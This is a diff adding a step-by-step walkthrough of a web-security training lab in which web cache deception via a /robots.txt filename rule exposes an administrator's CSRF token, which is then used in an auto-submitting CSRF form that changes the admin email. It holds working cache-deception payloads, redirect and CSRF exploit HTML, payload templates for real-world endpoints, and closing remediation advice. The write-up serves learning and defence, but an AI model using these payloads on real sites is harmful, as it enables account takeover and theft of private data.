@@ -2094,3 +2094,837 @@ Web Cache Deception
 # 🔥 FINAL ONE-LINE SUMMARY
 
 The cache stores a private page because the server secretly transforms a fake static path into a sensitive endpoint.
+
+---
+
+## 🧠Lab -5 Web Cache Deception via Exact Filename Cache Rules + CSRF Token Theft
+
+---
+
+## 🧭 Overview
+
+```txt
+This lab combines multiple concepts together:
+
+1. Web Cache Deception
+2. Exact filename cache rules
+3. Delimiter discrepancies
+4. Normalization discrepancies
+5. CSRF exploitation
+```
+
+---
+
+## 🎯 Goal
+
+```txt
+Steal administrator CSRF token
+→ use it to forge a valid email-change request
+→ change administrator email
+```
+
+---
+
+## ❓ What Is This Topic?
+
+Normally:
+
+```txt
+/my-account
+```
+
+contains:
+
+```txt
+- private API keys
+- CSRF tokens
+- personal account data
+```
+
+❌ This page should NEVER be cached.
+
+But in this lab:
+
+```txt
+cache and origin server interpret URL differently
+```
+
+So attacker tricks:
+
+```txt
+Server → returns /my-account
+Cache  → thinks request is /robots.txt
+```
+
+Because:
+
+```txt
+/robots.txt
+```
+
+matches an exact filename cache rule → cache stores sensitive response.
+
+---
+
+## 🧠 Core Concepts
+
+---
+
+### 1️⃣ Exact Filename Cache Rules
+
+Unlike previous labs using:
+
+```txt
+.js
+.css
+```
+
+This lab uses exact filename caching:
+
+```txt
+/robots.txt
+/favicon.ico
+/index.html
+```
+
+✔ Cache stores response only if FINAL normalized path matches exactly.
+
+---
+
+### 2️⃣ Delimiter Discrepancy
+
+Example:
+
+```txt
+/my-account;abc
+```
+
+Server interprets:
+
+```txt
+/my-account
+```
+
+and ignores:
+
+```txt
+;abc
+```
+
+But cache may treat full string as path.
+
+---
+
+### 3️⃣ Normalization Discrepancy
+
+```txt
+/aaa/../robots.txt
+```
+
+→ becomes:
+
+```txt
+/robots.txt
+```
+
+Some systems normalize traversal sequences.
+
+Some do not.
+
+---
+
+## 🔍 Key Discovery In This Lab
+
+```txt
+Origin server:
+- uses delimiters
+- does NOT normalize traversal
+
+Cache:
+- DOES normalize traversal
+- caches exact filename /robots.txt
+```
+
+---
+
+## 🚀 Full Lab Walkthrough (Exact Sequence)
+
+---
+
+## Step 1 — Login
+
+```txt
+wiener:peter
+```
+
+---
+
+## Step 2 — Change Email Once
+
+Go to:
+
+```txt
+My Account
+```
+
+Change email.
+
+Purpose:
+
+```txt
+- generate change-email request
+- observe CSRF token
+```
+
+---
+
+## Step 3 — Observe CSRF Token
+
+In HTTP history find:
+
+```txt
+GET /my-account
+```
+
+Response contains:
+
+```html
+<input type="hidden" name="csrf" value="TOKEN">
+```
+
+Meaning:
+
+```txt
+email change action is CSRF protected
+```
+
+---
+
+## Step 4 — Send /my-account to Repeater
+
+```txt
+GET /my-account
+→ Send to Repeater
+```
+
+---
+
+## Step 5 — Test Path Abstraction
+
+```txt
+/my-account/abc → 404
+```
+
+Meaning:
+
+```txt
+server does NOT abstract extra path
+```
+
+---
+
+## Step 6 — Test Another Path Variant
+
+```txt
+/my-accountabc → 404
+```
+
+```txt
+No caching evidence
+Reference failure response
+```
+
+---
+
+## Step 7 — Send to Intruder
+
+```txt
+Payload:
+/my-account§§abc
+
+Attack type:
+Sniper
+```
+
+Disable:
+
+```txt
+URL-encode these characters
+```
+
+---
+
+## Step 8 — Identify Delimiters
+
+Sort by:
+
+```txt
+Status code
+```
+
+Characters returning:
+
+```txt
+200 OK
+
+;
+?
+```
+
+Meaning:
+
+```txt
+origin server uses them as delimiters
+```
+
+---
+
+## Step 9 — Test Static Extension Rules
+
+```txt
+/my-account?abc.js → no caching
+/my-account;abc.js → no caching
+```
+
+Meaning:
+
+```txt
+No .js extension cache rule exists
+```
+
+---
+
+## Step 10 — Test Normalization On Origin Server
+
+```txt
+/aaa/..%2fmy-account → 404
+```
+
+Meaning:
+
+```txt
+origin server does NOT:
+- decode traversal
+- normalize path
+```
+
+---
+
+## Step 11 — Investigate Static Directories
+
+Observe:
+
+```txt
+/resources/
+```
+
+But:
+
+```txt
+no caching evidence
+```
+
+Meaning:
+
+```txt
+no static directory cache rule
+```
+
+---
+
+## Step 12 — Test Exact Filename Cache Rules
+
+```txt
+/robots.txt
+```
+
+First response:
+
+```txt
+X-Cache: miss
+```
+
+Second response:
+
+```txt
+X-Cache: hit
+```
+
+Meaning:
+
+```txt
+cache stores /robots.txt
+```
+
+---
+
+## Step 13 — Test Cache Normalization
+
+```txt
+/aaa/..%2frobots.txt
+```
+
+Still cached.
+
+Meaning:
+
+```txt
+cache normalized:
+
+/aaa/../robots.txt
+→ /robots.txt
+```
+
+⚠️ VERY IMPORTANT
+
+---
+
+## Step 14 — Build Exploit Payload Using ?
+
+```txt
+/my-account?%2f%2e%2e%2frobots.txt
+```
+
+Response:
+
+```txt
+200 OK
+NOT cached
+```
+
+Meaning:
+
+```txt
+? fails for cache trick
+```
+
+---
+
+## Step 15 — Build Exploit Payload Using ;
+
+```txt
+/my-account;%2f%2e%2e%2frobots.txt
+```
+
+First request:
+
+```txt
+X-Cache: miss
+```
+
+Second request:
+
+```txt
+X-Cache: hit
+```
+
+🔥 SUCCESS
+
+---
+
+## 💥 Why Final Payload Works
+
+Payload:
+
+```txt
+/my-account;%2f%2e%2e%2frobots.txt
+```
+
+---
+
+## 🔵 Cache Interpretation
+
+Cache normalizes:
+
+```txt
+/my-account;/../robots.txt
+→ /robots.txt
+```
+
+Cache thinks:
+
+```txt
+This is robots.txt
+```
+
+and caches response.
+
+---
+
+## 🟢 Server Interpretation
+
+Server sees delimiter:
+
+```txt
+;
+```
+
+So server truncates request to:
+
+```txt
+/my-account
+```
+
+and returns:
+
+```txt
+- API key
+- CSRF token
+- private account data
+```
+
+---
+
+## 📦 Result
+
+```txt
+Cache stores private my-account response
+under cache object:
+/robots.txt
+```
+
+---
+
+## 🧪 Step 16 — Create Exploit
+
+```html
+<script>
+document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"
+</script>
+```
+
+---
+
+## ⚡ Why ?wcd Is Added
+
+```txt
+Cache buster
+
+Purpose:
+- force unique cache key
+- prevent stale cache collisions
+- avoid victim receiving attacker cache
+```
+
+---
+
+## 🚨 Step 17 — Deliver Exploit
+
+```txt
+Administrator visits malicious URL
+→ admin response becomes cached
+```
+
+---
+
+## 🔓 Step 18 — Retrieve Cached Admin Response
+
+❌ DO NOT use browser.
+
+Use:
+
+```txt
+Repeater
+```
+
+Because browser may:
+
+```txt
+- redirect
+- invalidate sessions
+- auto-handle cache strangely
+```
+
+---
+
+## 🧲 Step 19 — Request Cached URL
+
+```txt
+/my-account;%2f%2e%2e%2frobots.txt?wcd
+```
+
+Send within:
+
+```txt
+30 seconds
+```
+
+Response contains:
+
+```txt
+administrator CSRF token
+```
+
+Copy token.
+
+---
+
+## 📨 Step 20 — Find Change Email POST Request
+
+```txt
+POST /my-account/change-email
+```
+
+Send to Repeater.
+
+---
+
+## 🔁 Step 21 — Replace CSRF Token
+
+```txt
+Replace your token
+with administrator token
+```
+
+---
+
+## 📧 Step 22 — Change Email
+
+```txt
+pwned@evil.com
+```
+
+---
+
+## 🛠 Step 23 — Generate CSRF PoC
+
+Burp Pro:
+
+```txt
+Generate CSRF PoC
+```
+
+Community Edition:
+
+```txt
+Create manual HTML form
+```
+
+---
+
+## 📜 Manual CSRF PoC
+
+```html
+<html>
+<body>
+
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+
+<input type="hidden" name="email" value="pwned@evil.com">
+
+<input type="hidden" name="csrf" value="ADMIN_TOKEN">
+
+<input type="submit" value="Submit">
+
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+
+</body>
+</html>
+```
+
+---
+
+## 🚀 Step 24 — Deliver Final Exploit
+
+```txt
+Victim browser auto-submits form
+→ sends valid admin token
+→ changes admin email
+```
+
+✅ Lab solved.
+
+---
+
+## 🔗 Complete Attack Chain
+
+```txt
+1. Find private endpoint
+2. Discover delimiters
+3. Discover normalization discrepancy
+4. Discover filename cache rule
+5. Craft payload
+6. Poison cache with victim response
+7. Steal admin CSRF token
+8. Forge valid CSRF request
+9. Change admin email
+```
+
+---
+
+## 🧠 Mental Model
+
+Think of this attack as:
+
+```txt
+Server and cache speak different URL languages
+```
+
+Attacker creates one URL.
+
+But:
+
+```txt
+Server → /my-account
+Cache  → /robots.txt
+```
+
+Result:
+
+```txt
+Sensitive data cached as public file
+```
+
+---
+
+## 🎯 High-Value Real-World Targets
+
+Sensitive endpoints:
+
+```txt
+/my-account
+/profile
+/dashboard
+/api/user
+/settings
+/orders
+/billing
+/admin
+```
+
+Dangerous cacheable filenames:
+
+```txt
+/robots.txt
+/favicon.ico
+/index.html
+```
+
+Dangerous cacheable directories:
+
+```txt
+/static
+/resources
+/assets
+/images
+/scripts
+```
+
+---
+
+## 🧪 Common Exploit Payload Structures
+
+Delimiter-based:
+
+```txt
+/profile;fake.js
+```
+
+Normalization-based:
+
+```txt
+/resources/..%2fprofile
+```
+
+Filename-rule-based:
+
+```txt
+/profile;%2f%2e%2e%2frobots.txt
+```
+
+---
+
+## 🛡 Remediation
+
+---
+
+### 1️⃣ Never Cache Authenticated Responses
+
+```http
+Cache-Control: private, no-store
+```
+
+---
+
+### 2️⃣ Normalize URLs Consistently
+
+Ensure:
+
+```txt
+cache
+CDN
+reverse proxy
+origin server
+```
+
+all process URLs identically.
+
+---
+
+### 3️⃣ Disable Cache On Sensitive Endpoints
+
+```txt
+Never cache:
+- account pages
+- dashboards
+- profile APIs
+- authenticated GET responses
+```
+
+---
+
+### 4️⃣ Avoid Path-Based Cache Rules Alone
+
+Avoid:
+
+```txt
+cache *.js
+cache /robots.txt
+cache /resources/*
+```
+
+without authentication awareness.
+
+---
+
+### 5️⃣ Strip Delimiters
+
+Reject suspicious:
+
+```txt
+;
+%23
+%3f
+..%2f
+```
+
+before cache layer.
+
+---
+
+## 🔥 Key Takeaway
+
+```txt
+Web cache deception happens because:
+
+cache and origin server interpret the SAME URL differently
+```
+
+Attacker weaponizes:
+
+```txt
+- delimiters
+- traversal
+- normalization
+- cache rules
+```
+
+to make:
+
+```txt
+private responses become public cached content
+```
